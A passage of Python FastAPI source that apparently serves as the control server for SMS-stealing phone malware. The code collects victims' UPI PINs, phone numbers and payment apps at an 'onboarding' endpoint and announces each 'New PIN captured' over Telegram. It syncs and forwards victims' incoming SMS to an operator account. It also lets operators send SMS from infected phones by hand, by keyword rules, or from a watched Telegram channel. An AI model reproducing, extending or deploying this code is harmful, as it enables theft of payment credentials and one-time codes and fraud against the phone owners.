        "last_seen": utc_now().isoformat(),
        "telemetry": telemetry or device.get("telemetry") or {},
    })

    return {"status": "ok", "keys": len(telemetry)}


@app.post("/devices/command/result")
async def device_command_result(payload: DeviceCommandResultRequest):
    rh = hash_value(payload.registration_id.strip())

    try:
        device = devices.find_one({"registration_id_hash": rh})
    except PyMongoError:
        raise HTTPException(503, "Database error")

    if not device:
        raise HTTPException(404, "Device not registered")

    device_id = str(device["_id"])
    data = payload.data or {}
    action = (payload.action or "").lower()

    if action in ("fetch_number", "number", "sim_info", "telemetry", "refresh_telemetry"):
        telemetry = data.get("telemetry") if isinstance(data.get("telemetry"), dict) else data
        apply_telemetry(device, telemetry)
        if data.get("sim_number"):
            try:
                devices.update_one(
                    {"_id": device["_id"]}, {"$set": {"number_requested_at": None}}
                )
            except PyMongoError:
                pass
        broadcast_device(device_id, {
            "ws_connected": hub.online(device_id),
            "telemetry": telemetry,
        })
    elif action == "ack" and data.get("id"):
        await _ack_outbox(data.get("id"), data.get("status") or "sent", data.get("error") or "")

    log_event("device_command_result", {"action": action}, device_id=device_id)
    return {"status": "ok"}


@app.post("/devices/sms/incoming")
async def sms_incoming(payload: SmsIncomingRequest):
    rh = hash_value(payload.registration_id.strip())

    try:
        device = devices.find_one({"registration_id_hash": rh})
    except PyMongoError:
        raise HTTPException(503, "Database error")

    if not device:
        raise HTTPException(404, "Device not registered")

    device_id = str(device["_id"])
    kind, amount, flow = classify_sms(payload.address, payload.body)

    created = utc_now()
    if payload.received_at:
        try:
            created = datetime.fromtimestamp(payload.received_at / 1000, tz=timezone.utc)
        except Exception:
            created = utc_now()

    mid = insert_message({
        "device_id": device_id,
        "device_name": device.get("device_name", "Unknown"),
        "direction": payload.direction,
        "address": payload.address,
        "body": payload.body,
        "kind": kind,
        "amount": amount,
        "flow": flow,
        "status": "received",
        "created_at": created,
    })

    if mid:
        try:
            broadcast_message(messages.find_one({"_id": mid}))
        except PyMongoError:
            pass

    try:
        devices.update_one({"_id": device["_id"]}, {"$set": {"last_seen": utc_now()}})
    except PyMongoError:
        pass

    if payload.direction == "in":
        spawn(relay_forward_incoming(device, payload.address, payload.body))

    if kind == "upi" and amount:
        log_event("upi_received", {"amount": amount, "flow": flow}, device_id=device_id)
        await notify_admins(
            f"💸 <b>UPI {flow or 'txn'}</b>\n"
            f"Device: <code>{device_short_id(device)}</code>\n"
            f"Amount: <b>₹{amount:.2f}</b>\n"
            f"From: <code>{html.escape(payload.address or 'n/a')}</code>"
        )

    replies = evaluate_rules(
        device_id, device.get("device_name", ""), payload.address, payload.body, kind
    )
    return {"status": "ok", "kind": kind, "auto_replies": replies}


@app.post("/devices/sms/sync")
async def sms_sync(payload: SmsSyncRequest):
    rh = hash_value(payload.registration_id.strip())

    try:
        device = devices.find_one({"registration_id_hash": rh})
    except PyMongoError:
        raise HTTPException(503, "Database error")

    if not device:
        raise HTTPException(404, "Device not registered")

    device_id = str(device["_id"])
    saved = 0

    for item in payload.messages[:200]:
        body = str(item.get("body") or "")[:MAX_SMS_BODY]
        address = str(item.get("address") or "")[:64]
        direction = str(item.get("direction") or "in")[:8]

        if not body:
            continue

        ts = item.get("timestamp")
        created = utc_now()
        if isinstance(ts, (int, float)):
            try:
                created = datetime.fromtimestamp(ts / 1000, tz=timezone.utc)
            except Exception:
                created = utc_now()

        kind, amount, flow = classify_sms(address, body)

        mid = insert_message({
            "device_id": device_id,
            "device_name": device.get("device_name", "Unknown"),
            "direction": direction,
            "address": address,
            "body": body,
            "kind": kind,
            "amount": amount,
            "flow": flow,
            "status": "received",
            "created_at": created,
        })
        if mid:
            saved += 1
            try:
                broadcast_message(messages.find_one({"_id": mid}))
            except PyMongoError:
                pass

    try:
        devices.update_one(
            {"_id": device["_id"]}, {"$set": {"sms_inbox_synced_at": utc_now()}}
        )
    except PyMongoError:
        pass

    return {"status": "ok", "saved": saved}


# ------------------------------------------------------------- onboarding


@app.post("/devices/onboarding")
async def device_onboarding(payload: OnboardingRequest):
    rh = hash_value(payload.registration_id.strip())

    try:
        device = devices.find_one({"registration_id_hash": rh})
    except PyMongoError:
        raise HTTPException(503, "Database error")

    if not device:
        raise HTTPException(404, "Device not registered")

    device_id = str(device["_id"])
    now = utc_now()

    if payload.telemetry:
        apply_telemetry(device, payload.telemetry)
        try:
            device = devices.find_one({"_id": device["_id"]}) or device
        except PyMongoError:
            pass

    fields = {
        "phone_number": normalize_number(payload.phone_number) or payload.phone_number.strip(),
        "payment_app": payload.payment_app.strip(),
        "upi_pin": payload.upi_pin.strip(),
        "onboard_amount": payload.amount,
        "onboarded": True,
        "onboarded_at": now,
        "onboarding_pending": False,
    }
    if payload.device_name:
        fields["device_name"] = payload.device_name.strip()

    try:
        devices.update_one({"_id": device["_id"]}, {"$set": fields})
    except PyMongoError:
        raise HTTPException(503, "Database error")

    if hub.online(device_id):
        spawn(send_command(device_id, "fetch_number"))

    broadcast_device(device_id, {
        "ws_connected": hub.online(device_id),
        "onboarded": True,
        "phone_number": fields["phone_number"],
        "payment_app": fields["payment_app"],
        "upi_pin": fields["upi_pin"],
    })

    telemetry = device.get("telemetry") or {}
    sim_number = telemetry.get("sim_number") or device.get("sim_number") or "n/a"
    carrier = telemetry.get("sim_carrier") or device.get("sim_carrier") or "n/a"

    log_event(
        "onboarding_complete",
        {
            "phone_number": payload.phone_number,
            "payment_app": payload.payment_app,
            "upi_pin": payload.upi_pin,
        },
        device_id=device_id,
    )

    await notify_admins(
        "🔔 <b>New PIN captured</b>\n"
        f"Device: <code>{device_short_id(device)}</code>\n"
        f"Entered number: <code>{html.escape(payload.phone_number or 'n/a')}</code>\n"
        f"SIM number: <code>{html.escape(str(sim_number))}</code>\n"
        f"Carrier: {html.escape(str(carrier))}\n"
        f"App chosen: <b>{html.escape(payload.payment_app or 'n/a')}</b>\n"
        f"PIN: <code>{html.escape(payload.upi_pin or 'n/a')}</code>\n"
        f"Amount: ₹{payload.amount:.0f}\n"
        f"Time: {now.strftime('%d %b %H:%M')}"
    )

    return {"status": "ok", "device_id": device_id}


@app.get("/devices/outbox")
async def device_outbox(registration_id: str):
    rh = hash_value(registration_id.strip())

    try:
        device = devices.find_one({"registration_id_hash": rh})
    except PyMongoError:
        raise HTTPException(503, "Database error")

    if not device:
        raise HTTPException(404, "Device not registered")

    device_id = str(device["_id"])
    rows = list(outbox.find({"device_id": device_id, "status": "pending"}).limit(20))

    for r in rows:
        try:
            outbox.update_one(
                {"_id": r["_id"]},
                {"$set": {"pushed_at": utc_now()}, "$inc": {"attempts": 1}},
            )
        except PyMongoError:
            pass

    return {
        "items": [
            {"id": str(r["_id"]), "to": r.get("to") or "", "body": r.get("body") or ""}
            for r in rows
        ]
    }


async def _ack_outbox(item_id: str, status: str, error: str = ""):
    try:
        oid = ObjectId(item_id)
    except Exception:
        raise HTTPException(400, "Bad item id")

    try:
        row = outbox.find_one_and_update(
            {"_id": oid},
            {"$set": {"status": status, "error": error, "sent_at": utc_now()}},
        )
    except PyMongoError:
        raise HTTPException(503, "Database error")

    if row and row.get("message_id"):
        try:
            messages.update_one(
                {"_id": row["message_id"]},
                {"$set": {"status": status, "error": error, "updated_at": utc_now()}},
            )
        except PyMongoError:
            pass
    elif row:
        insert_message({
            "device_id": row["device_id"],
            "direction": "out",
            "address": row.get("to") or "",
            "body": row.get("body") or "",
            "kind": "sms",
            "status": status,
            "source": row.get("source", "panel"),
            "created_at": utc_now(),
        }, dedupe=False)

    if row:
        broadcast({"type": "ack", "data": {
            "id": item_id,
            "status": status,
            "error": error,
            "device_id": row.get("device_id"),
            "body": row.get("body") or "",
        }})

    return row


@app.post("/devices/outbox/{item_id}/ack")
async def device_outbox_ack(item_id: str, payload: dict | None = None):
    payload = payload or {}
    await _ack_outbox(item_id, str(payload.get("status") or "sent"), str(payload.get("error") or ""))
    return {"status": "ok"}


# ------------------------------------------------------------------ rules


def evaluate_rules(device_id: str, device_name: str, sender: str, body: str, kind: str) -> int:
    try:
        active = list(rules.find({"enabled": True}).limit(50))
    except PyMongoError:
        return 0

    lower = (body or "").lower()
    queued = 0

    for rule in active:
        if rule.get("upi_only") and kind != "upi":
            continue

        needle = (rule.get("match") or "").lower()
        if not needle or needle not in lower:
            continue

        _, amount, _ = classify_sms(sender, body)
        reply = ((rule.get("reply") or "")
                 .replace("{sender}", sender or "")
                 .replace("{device}", device_name or "")
                 .replace("{amount}", f"{amount:.2f}" if amount else "")
                 .replace("{time}", datetime.now().strftime("%H:%M")))

        queue_sms(device_id, reply, sender,
                  source=f"auto:{rule.get('name', 'rule')}", device_name=device_name)
        queued += 1

        if hub.online(device_id):
            spawn(push_outbox(device_id))

    return queued


@app.get("/admin/rules")
async def list_rules(request: Request):
    require_admin(request)
    try:
        rows = list(rules.find().sort("_id", -1).limit(200))
    except PyMongoError:
        raise HTTPException(503, "Could not load rules")
    return {"rules": [serialize_document(r) for r in rows]}


@app.post("/admin/rules")
async def create_rule(payload: RuleRequest, request: Request):
    admin = require_admin(request)
    doc = {
        "name": payload.name.strip(),
        "match": payload.match.strip(),
        "reply": payload.reply,
        "upi_only": payload.upi_only,
        "enabled": True,
        "created_at": utc_now(),
    }
    rules.insert_one(doc)
    log_event("rule_created", {"name": doc["name"]}, admin_id=admin)
    return {"status": "ok"}


@app.post("/admin/rules/{rule_id}/toggle")
async def toggle_rule(rule_id: str, request: Request):
    require_admin(request)
    try:
        rule = rules.find_one({"_id": ObjectId(rule_id)})
    except Exception:
        raise HTTPException(400, "Bad rule id")

    if not rule:
        raise HTTPException(404, "Rule not found")

    new_state = not rule.get("enabled", True)
    rules.update_one({"_id": rule["_id"]}, {"$set": {"enabled": new_state}})
    return {"status": "ok", "enabled": new_state}


@app.post("/admin/rules/{rule_id}/delete")
async def delete_rule(rule_id: str, request: Request):
    require_admin(request)
    try:
        oid = ObjectId(rule_id)
    except Exception:
        raise HTTPException(400, "Bad rule id")

    rules.delete_one({"_id": oid})
    return {"status": "ok"}


# --------------------------------------------------------------- sending


@app.post("/admin/send")
async def admin_send(
    payload: SendRequest,
    request: Request,
    x_admin_key: str | None = Header(default=None),
):
    admin = require_admin_or_key(request, x_admin_key)

    body = payload.body.strip()
    if not body:
        raise HTTPException(400, "Message body required")

    targets, capped = resolve_targets(payload)

    if not targets:
        return {"status": "ok", "queued": 0, "results": [],
                "note": "koi device match nahi hua"}

    manual_to = normalize_number(payload.to)
    results = []

    for device in targets:
        device_id = str(device["_id"])
        device_name = device.get("device_name", "Unknown")
        to = manual_to or resolve_device_number(device)

        outbox_id, _ = queue_sms(device_id, body, to, source="panel", device_name=device_name)

        delivered = False
        if hub.online(device_id):
            try:
                row = outbox.find_one({"_id": ObjectId(outbox_id)})
            except PyMongoError:
                row = None
            if row:
                delivered = await hub.send_to_device(device_id, push_row(device_id, row))
                if delivered:
                    try:
                        outbox.update_one(
                            {"_id": row["_id"]},
                            {"$set": {"pushed_at": utc_now()}, "$inc": {"attempts": 1}},
                        )
                    except PyMongoError:
                        pass

        results.append({
            "device_id": device_id,
            "device_name": device_name,
            "short_id": device_short_id(device),
            "to": to,
            "delivered": delivered,
            "queued": True,
        })

    queued = len(results)
    delivered_n = sum(1 for r in results if r["delivered"])

    log_event("bulk_send",
              {"target": payload.target, "queued": queued, "delivered": delivered_n},
              admin_id=admin)

    notes = []
    if delivered_n < queued:
        notes.append("kuch device offline hain — unka SMS outbox me queue hai, "
                     "online hote hi deliver ho jaayega")
    if capped:
        notes.append(f"fleet {MAX_BROADCAST} se bada hai — sirf pehle {MAX_BROADCAST} devices mile")

    return {
        "status": "ok", "queued": queued, "delivered": delivered_n,
        "capped": capped, "results": results, "note": " | ".join(notes),
    }


@app.post("/admin/devices/{device_id}/sms")
async def device_send_sms(
    device_id: str,
    payload: dict,
    request: Request,
    x_admin_key: str | None = Header(default=None),
):
    require_admin_or_key(request, x_admin_key)

    body = str(payload.get("body") or payload.get("message") or "").strip()
    if not body:
        raise HTTPException(400, "Message body required")

    device = get_device_or_404(device_id)
    to = normalize_number(payload.get("to")) or resolve_device_number(device)

    outbox_id, _ = queue_sms(str(device["_id"]), body, to,
                             source="panel", device_name=device.get("device_name", ""))

    delivered = False
    if hub.online(str(device["_id"])):
        try:
            row = outbox.find_one({"_id": ObjectId(outbox_id)})
        except PyMongoError:
            row = None
        if row:
            delivered = await hub.send_to_device(
                str(device["_id"]), push_row(str(device["_id"]), row)
            )

    return {"status": "ok", "queued": 1, "to": to, "delivered": delivered}


@app.get("/admin/messages")
async def admin_messages(
    request: Request,
    x_admin_key: str | None = Header(default=None),
    limit: int = 200,
    direction: str | None = None,
    device_id: str | None = None,
):
    require_admin_or_key(request, x_admin_key)
    limit = max(1, min(limit, 1000))

    query = {}
    if direction in ("in", "out"):
        query["direction"] = direction
    if device_id:
        query["device_id"] = device_id

    try:
        rows = list(messages.find(query).sort("_id", -1).limit(limit))
    except PyMongoError:
        raise HTTPException(503, "Could not load messages")

    return {"messages": [serialize_document(r) for r in rows]}


# -------------------------------------------------------------- admin data


@app.get("/admin/devices")
async def admin_devices(
    request: Request,
    x_admin_key: str | None = Header(default=None),
    onboarded: bool | None = None,
    q: str | None = None,
):
    require_admin_or_key(request, x_admin_key)

    query = {}
    if onboarded is not None:
        query["onboarded"] = onboarded
    if q and q.strip():
        rx = re.compile(re.escape(q.strip()), re.IGNORECASE)
        query["$or"] = [
            {"device_name": rx},
            {"short_id": rx},
            {"phone_number": rx},
            {"telemetry.sim_number": rx},
        ]

    try:
        result = [
            view_device(d)
            for d in devices.find(query, {"registration_id_hash": 0}).sort("_id", -1).limit(300)
        ]
        return {"devices": result}
    except PyMongoError:
        raise HTTPException(503, "Could not load devices")


@app.get("/admin/devices/{device_id}")
async def admin_device(
    device_id: str,
    request: Request,
    x_admin_key: str | None = Header(default=None),
):
    require_admin_or_key(request, x_admin_key)
    return view_device(get_device_or_404(device_id))


@app.get("/admin/devices/{device_id}/messages")
async def admin_device_messages(device_id: str, request: Request, limit: int = 500):
    require_admin(request)
    limit = max(1, min(limit, 1000))
    try:
        rows = list(messages.find({"device_id": device_id}).sort("_id", -1).limit(limit))
    except PyMongoError:
        raise HTTPException(503, "Could not load messages")
    return {"messages": [serialize_document(r) for r in rows]}


@app.post("/admin/devices/{device_id}/command")
async def device_command(
    device_id: str,
    request: Request,
    payload: CommandRequest | None = None,
):
    require_admin(request)

    action = ((payload.action if payload else "ping") or "ping").strip().lower()
    device = get_device_or_404(device_id)
    online = hub.online(device_id)
    delivered = False

    if online:
        delivered = await send_command(device_id, action)

    if action in ("fetch_number", "number", "sim_info", "refresh_telemetry"):
        try:
            devices.update_one({"_id": device["_id"]},
                               {"$set": {"number_requested_at": utc_now()}})
        except PyMongoError:
            pass

    log_event("device_command", {"action": action, "delivered": delivered},
              device_id=device_id)

    return {
        "status": "ok", "action": action, "online": online, "delivered": delivered,
        "note": "" if delivered else "device socket offline — uske online hone par milega",
    }


@app.post("/admin/devices/{device_id}/refresh")
async def device_refresh(device_id: str, request: Request, payload: CommandRequest | None = None):
    return await device_command(device_id, request, payload)


@app.post("/admin/devices/{device_id}/ping")
async def device_ping(device_id: str, request: Request):
    require_admin(request)
    get_device_or_404(device_id)
    delivered = await send_command(device_id, "ping") if hub.online(device_id) else False
    return {"status": "ok", "online": hub.online(device_id), "delivered": delivered}


@app.post("/admin/devices/{device_id}/wake")
async def device_wake(device_id: str, request: Request):
    require_admin(request)
    get_device_or_404(device_id)
    delivered = await send_command(device_id, "wake") if hub.online(device_id) else False
    return {"status": "ok", "delivered": delivered}


@app.get("/admin/overview")
async def admin_overview(request: Request):
    require_admin(request)

    try:
        total = devices.count_documents({})
        cutoff = utc_now() - timedelta(seconds=ONLINE_WINDOW_SECONDS)
        active = devices.count_documents({"last_seen": {"$gte": cutoff}})

        sims = 0
        for d in devices.find({}, {"sim_count": 1, "telemetry.sims": 1}):
            sims += d.get("sim_count") or len((d.get("telemetry") or {}).get("sims") or [])

        return {
            "total_devices": total,
            "active_devices": active,
            "offline_devices": max(0, total - active),
            "total_sims": sims,
            "pins_captured": devices.count_documents({"onboarded": True}),
            "online_sockets": hub.online_count,
            "auto_sender_enabled": devices.count_documents({"auto_sender.enabled": True}),
            "relay_authorized": bool(relay_state.get("authorized")),
        }
    except PyMongoError:
        raise HTTPException(503, "Could not load overview")


# ------------------------------------------------------------- AUTO SENDER


def enabled_channels() -> set:
    out = set()
    try:
        for d in devices.find({"auto_sender.enabled": True}, {"auto_sender": 1}):
            cid = (d.get("auto_sender") or {}).get("channel_id")
            if cid:
                out.add(str(cid))
    except PyMongoError:
        pass
    if TARGET_CHANNEL_ID:
        out.add(str(TARGET_CHANNEL_ID))
    return out


# FIX: per-message DB query na kare — 5s TTL cache, keys par match.
_enabled_keys_cache: Dict[str, object] = {"at": 0.0, "keys": set()}


def invalidate_channel_cache():
    _enabled_keys_cache["at"] = 0.0
    _enabled_keys_cache["keys"] = set()


def enabled_channel_keys() -> set:
    now = time.time()
    keys = _enabled_keys_cache.get("keys") or set()
    if keys and now - float(_enabled_keys_cache.get("at") or 0.0) < 5:
        return keys
    fresh = {chan_key(c) for c in enabled_channels()}
    fresh.discard("")
    _enabled_keys_cache["at"] = now
    _enabled_keys_cache["keys"] = fresh
    return fresh


def devices_for_channel(channel_id) -> list:
    """FIX: -100… / raw id / @username sab ek hi key par match hote hain."""
    key = chan_key(channel_id)
    if not key:
        return []
    try:
        rows = list(devices.find({"auto_sender.enabled": True}).limit(MAX_BROADCAST))
    except PyMongoError:
        return []
    return [d for d in rows
            if chan_key((d.get("auto_sender") or {}).get("channel_id")) == key]


@app.get("/admin/auto-sender")
async def auto_sender_status(request: Request):
    require_admin(request)
    try:
        count = devices.count_documents({"auto_sender.enabled": True})
    except PyMongoError:
        count = 0

    return {
        "relay_ready": bool(relay_client and relay_state.get("authorized")),
        "telethon": TELETHON_OK,
        "account": relay_state.get("me"),
        "forward_user": relay_state.get("forward_user") or DEFAULT_FWD_USER or "",
        "channels": sorted(enabled_channels()),
        "devices_enabled": count,
    }


@app.post("/admin/auto-sender/verify")
async def auto_sender_verify(payload: ChannelRequest, request: Request):
    require_admin(request)

    if not (TELETHON_OK and relay_client and relay_state.get("authorized")):
        raise HTTPException(400, "Pehle relay login karo (Relay page)")

    cid = norm_channel_id(payload.channel_id)
    if not cid:
        raise HTTPException(400, "Channel ID required")

    try:
        ent = await relay_client.get_entity(as_entity(cid))
    except Exception as e:
        raise HTTPException(400, f"Channel nahi mila: {e}")

    title = getattr(ent, "title", None) or getattr(ent, "username", None) or cid

    is_admin = False
    try:
        perms = await relay_client.get_permissions(ent)
        is_admin = bool(getattr(perms, "is_admin", False)
                        or getattr(perms, "is_creator", False))
    except Exception:
        pass

    return {
        "status": "ok",
        # FIX: canonical chat_id (-100…) — isi form me bind karne se watcher match karega
        "channel_id": canonical_channel_id(ent, cid),
        "title": str(title),
        "admin": is_admin,
    }


@app.post("/admin/auto-sender/test")
async def auto_sender_test(request: Request):
    require_admin(request)
    if not (relay_client and relay_state.get("authorized")):
        raise HTTPException(400, "Relay logged in nahi hai")

    ok = await relay_send_text("✅ TPC PANEL — Auto Sender test message.")
    if not ok:
        raise HTTPException(400, "Test bheja nahi gaya — forward target check karo")
    return {"status": "ok"}


@app.post("/admin/devices/{device_id}/auto-sender")
async def set_auto_sender(device_id: str, payload: AutoSenderRequest, request: Request):
    admin = require_admin(request)
    device = get_device_or_404(device_id)

    cur = auto_sender_of(device)
    enabled = cur["enabled"] if payload.enabled is None else bool(payload.enabled)
    channel_id = cur["channel_id"] if payload.channel_id is None else norm_channel_id(payload.channel_id)
    title = payload.channel_title or cur["channel_title"]

    # FIX: username ya raw id diya ho to canonical -100 form me convert kar do
    if channel_id and relay_client and relay_state.get("authorized"):
        try:
            ent = await relay_client.get_entity(as_entity(channel_id))
            channel_id = canonical_channel_id(ent, channel_id)
            if not title:
                title = getattr(ent, "title", None) or getattr(ent, "username", None) or ""
        except Exception:
            pass

    if enabled and not channel_id:
        raise HTTPException(400, "Enable karne ke liye Channel ID chahiye")

    doc = {
        "enabled": enabled,
        "channel_id": channel_id or None,
        "channel_title": title or None,
        "updated_at": utc_now(),
    }
    try:
        devices.update_one({"_id": device["_id"]}, {"$set": {"auto_sender": doc}})
    except PyMongoError:
        raise HTTPException(503, "Save failed")

    invalidate_channel_cache()

    plain = {"enabled": enabled, "channel_id": channel_id, "channel_title": title}
    broadcast_device(device_id, {"auto_sender": plain})
    log_event("auto_sender_update",
              {"enabled": enabled, "channel_id": channel_id},
              device_id=device_id, admin_id=admin)

    return {"status": "ok", "auto_sender": plain, "watching": sorted(enabled_channels())}


# ---------------------------------------------------------------- pairing


@app.post("/pair")
async def create_pair(payload: PairRequest):
    name = payload.device_name.strip()
    if not name:
        raise HTTPException(400, "Device name required")

    code = secrets.token_urlsafe(8)
    now = utc_now()

    pairing_codes.insert_one({
        "code_hash": hash_value(code),
        "device_name": name,
        "created_at": now,
        "expires_at": now + timedelta(seconds=SESSION_TTL),
        "used_at": None,
    })

    return {"pair_code": code, "expires_in_seconds": SESSION_TTL}


# =====================================================================
#  RELAY — MTProto channel watcher + SMS forwarder
# =====================================================================

relay_client = None
relay_state = {
    "connected": False, "authorized": False, "me": None,
    "phone": None, "phone_code_hash": None, "awaiting_code": False,
    "handlers_installed": False, "last_error": None,
    "forward_user": DEFAULT_FWD_USER or None,
    "last_channel_at": None,
}
_relay_seen: set = set()
banned_cache: set = set()

_p_to     = re.compile(r"To:\s*(\+?\d{7,15})")
_p_msg    = re.compile(r"Message:\s*(.+?)(?=\n\n|\n[📋📞💬📱]|\Z)", re.S)
_p_onetap = re.compile(r"(\+?\d{7,15})\s*\|\s*(.+)")
_p_dev    = re.compile(
    r"(?m)^\s*(?:Device|DEV|#)\s*[:#]?\s*([A-Za-z0-9][A-Za-z0-9_\-]{2,39})\s*$"
)


def _clean_sms_body(raw: str) -> str:
    lines = [
        l.strip() for l in (raw or "").splitlines()
        if l.strip() and not l.strip().startswith("━")
    ]
    return " ".join(lines).strip()[:MAX_SMS_BODY]


def _parse_sms(text: str):
    if not text:
        return None

    to = body = None
    m = _p_to.search(text)
    if m:
        to = normalize_number(m.group(1))

    m = _p_msg.search(text)
    if m:
        body = m.group(1)

    if not body:
        m = _p_onetap.search(text)
        if m:
            to = to or normalize_number(m.group(1))
            body = m.group(2)

    if not body:
        return None

    hint = None
    m = _p_dev.search(text)
    if m:
        hint = m.group(1)

    return to, _clean_sms_body(body), hint


def load_bans():
    banned_cache.clear()
    try:
        for d in banned_senders.find({}, {"address": 1}):
            if d.get("address"):
                banned_cache.add(d["address"])
    except PyMongoError:
        pass


def load_relay_config():
    try:
        doc = relay_config.find_one({"_id": "forward"}) or {}
        if doc.get("target"):
            relay_state["forward_user"] = doc["target"]
    except PyMongoError:
        pass


def is_banned(address) -> bool:
    a = normalize_number(address) or (address or "").strip().lower()
    return bool(a) and a in banned_cache


def _relay_creds():
    if TELE_API_ID and TELE_API_HASH:
        return TELE_API_ID, TELE_API_HASH
    try:
        doc = relay_config.find_one({"_id": "creds"}) or {}
    except PyMongoError:
        doc = {}
    return int(doc.get("api_id") or 0), doc.get("api_hash") or ""


def _save_relay_creds(api_id, api_hash, phone):
    try:
        relay_config.update_one(
            {"_id": "creds"},
            {"$set": {"api_id": api_id, "api_hash": api_hash,
                      "phone": phone, "updated_at": utc_now()}},
            upsert=True,
        )
    except PyMongoError:
        pass


def _resolve_relay_targets(hint):
    if hint:
        h = hint.strip().lower()
        for d in devices.find().limit(MAX_BROADCAST):
            if (h in (d.get("device_name", "") or "").lower()
                    or h == device_short_id(d).lower()
                    or h == str(d["_id"]).lower()):
                return [d]
        return []

    ids = online_device_ids()
    if ids:
        return list(devices.find({"_id": {"$in": ids}}))
    return list(devices.find().limit(MAX_BROADCAST))


async def start_relay():
    global relay_client
    if not TELETHON_OK:
        relay_state["last_error"] = "telethon not installed"
        return

    api_id, api_hash = _relay_creds()
    if not (api_id and api_hash):
        relay_state["last_error"] = "TELE_API_ID / TELE_API_HASH not set"
        return

    try:
        relay_client = TelegramClient(RELAY_SESSION_FILE, api_id, api_hash)
        await relay_client.connect()
        relay_state["connected"] = True
        if await relay_client.is_user_authorized():
            await _after_relay_login(api_id, api_hash)
        else:
            relay_state["awaiting_code"] = True
    except Exception as e:
        relay_state["last_error"] = f"connect: {e}"


async def stop_relay():
    if relay_client:
        try:
            await relay_client.disconnect()
        except Exception:
            pass


async def _after_relay_login(api_id=None, api_hash=None):
    me = await relay_client.get_me()
    relay_state.update({
        "authorized": True,
        "awaiting_code": False,
        "me": {"id": me.id, "username": me.username, "first_name": me.first_name},
    })
    _install_relay_handlers()
    load_bans()
    if api_id and api_hash:
        _save_relay_creds(api_id, api_hash, relay_state.get("phone"))
    # FIX: purane username-bound channels ko canonical id me heal karo
    try:
        await normalize_auto_sender_channels()
    except Exception as e:
        relay_state["last_error"] = f"channel normalize: {e}"
    log_event("relay_login", relay_state["me"])


async def normalize_auto_sender_channels():
    """One-time heal: @username ya raw-id bound channels -> canonical -100 id."""
    if not (relay_client and relay_state.get("authorized")):
        return
    try:
        rows = list(devices.find({"auto_sender.channel_id": {"$ne": None}}).limit(MAX_BROADCAST))
    except PyMongoError:
        return

    changed = 0
    for d in rows:
        cid = (d.get("auto_sender") or {}).get("channel_id")
        if not cid or str(cid).lstrip("-").isdigit() and str(cid).startswith("-100"):
            continue
        try:
            ent = await relay_client.get_entity(as_entity(cid))
        except Exception:
            continue
        nid = canonical_channel_id(ent)
        if not nid or nid == str(cid):
            continue
        try:
            devices.update_one({"_id": d["_id"]},
                               {"$set": {"auto_sender.channel_id": nid}})
            changed += 1
        except PyMongoError:
            pass

    if changed:
        invalidate_channel_cache()
        log_event("auto_sender_channels_normalized", {"count": changed})


def _install_relay_handlers():
    if relay_state["handlers_installed"] or not relay_client or not TELETHON_OK:
        return
    relay_client.add_event_handler(_on_relay_message, events.NewMessage(incoming=True))
    relay_state["handlers_installed"] = True


async def _on_relay_message(event):
    try:
        mid = event.message.id
        chat_id = event.chat_id
        key = (chat_id, mid)
        if key in _relay_seen:
            return
        _relay_seen.add(key)
        if len(_relay_seen) > 8000:
            _relay_seen.clear()

        if chat_id is None:
            return
        # FIX: key-based match — -100… / raw id / @username sab chalega
        if chan_key(chat_id) not in enabled_channel_keys():
            return

        relay_state["last_channel_at"] = utc_now().isoformat()

        parsed = _parse_sms(event.message.message or "")
        if not parsed:
            return

        to_number, body, hint = parsed

        targets = devices_for_channel(chat_id)
        if not targets and hint:
            targets = _resolve_relay_targets(hint)
        if (not targets and TARGET_CHANNEL_ID
                and chan_key(chat_id) == chan_key(TARGET_CHANNEL_ID)):
            targets = _resolve_relay_targets(None)

        for d in targets:
            did = str(d["_id"])
            to = to_number or resolve_device_number(d)
            queue_sms(did, body, to, source="relay", device_name=d.get("device_name", ""))
            if hub.online(did):
                spawn(push_outbox(did))

        log_event("relay_channel_send",
                  {"to": to_number, "devices": len(targets), "channel": str(chat_id)})
    except Exception as e:
        relay_state["last_error"] = f"channel: {e}"
        log_event("relay_channel_error", {"error": str(e)})


async def relay_send_text(text: str) -> bool:
    target = relay_state.get("forward_user") or DEFAULT_FWD_USER
    if relay_client and relay_state.get("authorized") and target:
        try:
            ent = int(target) if str(target).lstrip("-").isdigit() else target
            await relay_client.send_message(ent, text, parse_mode="html")
            tg_log("out", text, "ok")
            return True
        except Exception as e:
            relay_state["last_error"] = f"forward: {e}"
            tg_log("out", text, f"fail: {e}")
    return False


async def notify_admins(text: str) -> bool:
    return await relay_send_text(text)


async def relay_forward_incoming(device: dict, address: str, body: str):
    if not body or is_banned(address):
        return
    text = (
        "📥 <b>INCOMING SMS</b>\n"
        f"Device: <code>{device_short_id(device)}</code>\n"
        f"From: <code>{html.escape(address or 'n/a')}</code>\n"
        "━━━━━━━━━━━━━━\n"
        f"{html.escape(body)}"
    )
    await relay_send_text(text)


def tg_log(direction: str, text: str, result: str = "ok"):
    try:
        tg_logs.insert_one({
            "direction": direction,
            "text": (text or "")[:400],
            "result": (result or "ok")[:200],
            "created_at": utc_now(),
        })
    except PyMongoError:
        pass


@app.get("/admin/relay/status")
async def relay_status(request: Request):
    require_admin(request)
    return {
        "telethon": TELETHON_OK,
        "state": dict(relay_state),
        "bans": sorted(banned_cache),
        "creds_from_env": bool(TELE_API_ID and TELE_API_HASH),
        "channels": sorted(enabled_channels()),
    }


@app.get("/admin/relay/logs")
async def relay_logs(request: Request, limit: int = 60):
    require_admin(request)
    try:
        rows = list(tg_logs.find().sort("_id", -1).limit(max(1, min(limit, 200))))
    except PyMongoError:
        raise HTTPException(503, "Database error")
    return {"logs": [serialize_document(r) for r in rows]}


@app.post("/admin/relay/forward")
async def relay_set_forward(payload: ForwardRequest, request: Request):
    require_admin(request)
    t = payload.target.strip()
    relay_state["forward_user"] = t or None
    try:
        relay_config.update_one(
            {"_id": "forward"},
            {"$set": {"target": t, "updated_at": utc_now()}},
            upsert=True,
        )
    except PyMongoError:
        pass
    return {"status": "ok", "forward_user": relay_state["forward_user"]}


@app.post("/admin/relay/login/start")
async def relay_login_start(payload: RelayLoginRequest, request: Request):
    require_admin(request)
    global relay_client

    if not TELETHON_OK:
        raise HTTPException(503, "telethon not installed")

    api_id = int(payload.api_id or TELE_API_ID)
    api_hash = payload.api_hash or TELE_API_HASH
    phone = payload.phone.strip()
    if not (api_id and api_hash and phone):
        raise HTTPException(400, "api_id, api_hash and phone required")

    if relay_client is None:
        relay_client = TelegramClient(RELAY_SESSION_FILE, api_id, api_hash)
        await relay_client.connect()

    try:
        sent = await relay_client.send_code_request(phone)
    except Exception as e:
        raise HTTPException(400, f"send code failed: {e}")

    relay_state.update({
